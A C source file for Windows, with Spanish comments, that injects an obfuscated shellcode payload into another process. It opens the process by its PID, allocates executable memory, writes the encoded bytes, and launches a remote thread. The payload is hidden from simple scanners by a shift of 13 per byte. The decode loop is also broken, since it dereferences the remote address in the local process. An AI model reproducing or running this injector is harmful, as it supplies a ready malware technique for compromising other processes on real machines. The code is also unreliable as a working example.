#include <Windows.h>
#include <stdio.h>

DWORD PID, TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;


// Aqui va el payload a ejecutarse.
unsigned char lich[] = "\xfc\x55\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x4e\x44\x4e\x43\x45\x44\x49\x55\x34\xd2\x72\x55\x8b\x45\x60\x55\x8b\x45\x18\x55\x8b\x45\x20\x55\x8b\x65\x43\x55\x0f\xb7\x57\x57\x5a\x34\xc9\x55\x34\xc0\xac\x3c\x6e\x7c\x02\x2c\x20\x4e\xc1\xc9\x0d\x4e\x01\xc1\xe2\xed\x45\x4e\x44\x55\x8b\x45\x20\x8b\x4f\x3c\x55\x01\xd0\x8b\x80\x88\x00\x00\x00\x55\x85\xc0\x67\x74\x55\x01\xd0\x43\x8b\x55\x18\x51\x8b\x40\x20\x56\x01\xd0\xe3\x49\x55\xff\xc9\x4e\x8b\x37\x88\x55\x01\xd6\x5a\x34\xc9\x55\x34\xc0\xac\x4e\xc1\xc9\x0d\x4e\x01\xc1\x31\xe0\x68\xf1\x59\x03\x59\x24\x08\x52\x32\xd1\x68\xd8\x4b\x51\x8b\x40\x24\x56\x01\xd0\x73\x4e\x8b\x0c\x55\x51\x8b\x40\x1c\x56\x01\xd0\x4e\x8b\x04\x88\x55\x01\xd0\x4e\x4b\x4e\x4b\x5e\x4c\x4d\x4e\x4b\x4e\x4c\x4e\x4d\x55\x83\xec\x20\x4e\x45\xff\xe0\x4b\x4e\x4c\x4d\x55\x8b\x12\xe9\x4a\xff\xff\xff\x5d\x55\xba\x01\x00\x00\x00\x00\x00\x00\x00\x55\x8d\x8d\x01\x01\x00\x00\x4e\xba\x34\x8b\x62\x87\xff\xd5\xbb\xf0\xb5\xa2\x49\x4e\xba\xa6\x95\xbd\x9d\xff\xd5\x55\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x68\x05\xbb\x54\x13\x65\x62\x77\x00\x4c\x4e\x89\xda\xff\xd5\x70\x6e\x79\x70\x00";

int main(int argc, char* argv[]) {

	PID = atoi(argv[1]);

	//Abrimos el proceso
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	//Creamos el espacio en la memoria para el codigo malicioso.
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(lich), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

	//Escribimos esa memoria alocada en la memoria de proceso
	WriteProcessMemory(hProcess, rBuffer, lich, sizeof(lich), NULL);

	for (int i = 0; i < sizeof lich; i++) {
		((char*)rBuffer)[i] = (((char*)rBuffer)[i]) - 13;
	}

	//Apunta al 
	hThread = CreateRemoteThreadEx( hProcess,NULL,0,(LPTHREAD_START_ROUTINE)rBuffer,NULL,0,0,&TID);

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	return EXIT_SUCCESS;
}